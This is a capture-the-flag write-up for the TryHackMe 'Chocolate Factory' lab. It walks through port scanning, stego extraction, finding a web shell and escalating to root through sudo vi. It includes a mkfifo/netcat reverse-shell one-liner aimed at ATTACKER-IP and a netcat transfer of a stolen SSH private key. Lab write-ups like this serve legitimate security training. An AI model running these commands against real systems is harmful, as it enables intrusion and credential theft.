# Chocolate Factory

***
![](https://tryhackme-images.s3.amazonaws.com/room-icons/e2eed78e92b4890174e0a2510b6e7a7c.jpeg)

## Difficulty = Easy

***


Running our nmap scan we have -:

```bash
# Nmap 7.94 scan initiated Tue Oct 24 20:57:20 2023 as: nmap -p- -sCV -T4 -v --min-rate=1000 -oN nmap.txt 10.10.122.96
Increasing send delay for 10.10.122.96 from 0 to 5 due to 181 out of 451 dropped probes since last increase.
Warning: 10.10.122.96 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.122.96
Host is up (0.14s latency).
Not shown: 61913 closed tcp ports (conn-refused), 3593 filtered tcp ports (no-response)
Bug in dicom-ping: no string output.
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.75.133
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:31:bb:b5:1f:cc:cc:12:14:8f:f0:d8:33:b0:08:9b (RSA)
|   256 e7:1f:c9:db:3e:aa:44:b6:72:10:3c:ee:db:1d:33:90 (ECDSA)
|_  256 b4:45:02:b6:24:8e:a9:06:5f:6c:79:44:8a:06:55:5e (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
100/tcp open  newacct?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"
101/tcp open  hostname?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"

--SNIP--
```

Logging in to `FTP` as anonymous, we have a `gum_room.jpg` file, which we can download using the `mget` command

![](https://i.imgur.com/9eF1nYO.png)

Running `stegseek` on the image we found a file with a **base64** encoded text

![](https://i.imgur.com/9jDBkZn.png)


Decoding with **cyberchef** we have user **charlie** hash in `SHA-512 Crypt` format

![](https://i.imgur.com/wxKF5DU.png)

Tried cracking this hash but to no avail, so i decided to check port `80/HTTP`

![](https://i.imgur.com/vhDhAzC.png)

Tried login in, also to no avail, Running dir/file bruteforce with `dirsearch` we have few entries


![](https://i.imgur.com/duGfFzg.png)

checking `/home.php` we have a web shell 😂

![](https://i.imgur.com/5drmyPp.png)

We can go ahead and start up our listener in `netcat` and get a reverse shell with the below payload

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER-IP 4444 >/tmp/f
```


![](https://i.imgur.com/5j8PRUp.png)

checking `/var/www/html`, looks like we found the key **tryhackme** talked about

![](https://i.imgur.com/fgyUeas.png)

Concatenating `validate.php` in this same directory we have user **charlie's** password

![](https://i.imgur.com/AKRdHHQ.png)

This password doesn't seem to work for user **charlie** when switching but it works on the website and refer us back to that command injection page

![](https://i.imgur.com/7iTTOaA.png)

Navigating to user **charlie** home directory, i found a teleport file that contains an `SSH` id_rsa 

![](https://i.imgur.com/UuscklX.png)

we can go ahead and send it to our attacker machine using `netcat`

```bash
# on target machine
$ cat teleport | nc -lp 1234

# on attacker machine
$ nc 10.10.224.194 1234 > teleport
```


![](https://i.imgur.com/JZAR9mB.png)


> **Note :** wait for few seconds, maybe 30 for the file to transfer cos' you won't see a prompt that it has been transferred then hit `Ctrl+C` on attacker machine to break connection


We logged in as user **charlie** via `SSH` using the private key


![](https://i.imgur.com/6dsjHxj.png)


Running `sudo -l` we can run `/usr/bin/vi` with sudo privileges without a password

![](https://i.imgur.com/kZd26Rb.png)

run `sudo /usr/bin/vi` and you should get a vi prompt

![](https://i.imgur.com/l1iuF00.png)


Then just type in`:shell` to spawn a shell with vi

![](https://i.imgur.com/zpUSLlN.png)

Click enter and you should be user **root**


![](https://i.imgur.com/73SzmFz.png)

Trying to read the root flag located under `/root/root.py` we have a program to give us the root flag

![](https://i.imgur.com/dOKHV1t.png)

Remember the key **tryhackme** asked us for ??, well use it and you should  get the root flag

![](https://i.imgur.com/Vx1Rtvs.png)



GG 😎


<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>
